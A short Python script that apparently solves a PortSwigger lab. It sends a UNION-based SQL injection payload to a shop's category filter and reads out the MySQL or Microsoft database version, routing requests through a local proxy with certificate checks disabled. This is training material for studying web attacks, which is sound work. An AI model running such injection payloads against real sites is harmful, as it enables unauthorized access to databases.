#!/usr/bin/env python3
# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
# Lab-Link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft>
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit(host, category):
    url = f'{host}/filter?category={category}'
    payload = "' UNION SELECT '~~DBVERSION~~',@@version%23"
    r1 = requests.get(f'{url}{payload}', verify=False, proxies=proxies)

    # I had some issues getting the 'congratulations' banner.
    # So get the page, wait a bit and re-get it
    time.sleep(2)
    r2 = requests.get(url, verify=False, proxies=proxies)
    if 'Congratulations, you solved the lab' in r2.text:
        print(f"[+] Dumping version information:")
        soup = BeautifulSoup(r1.text, 'html.parser')
        print(f"[+]   {soup.find('th', string = '~~DBVERSION~~').parent.findNext('td').contents[0]}")
        return True
    return False


if __name__ == "__main__":
    print('[+] SQL injection attack, querying the database type and version on MySQL and Microsoft')
    try:
        host = sys.argv[1].strip().rstrip('/')
        # category = sys.argv[2].strip()
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST> <CATEGORY>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    category = "notRelevant"

    if exploit(host, category):
        print('[+] Injection successful')
    else:
        print('[-] Injection not successful')
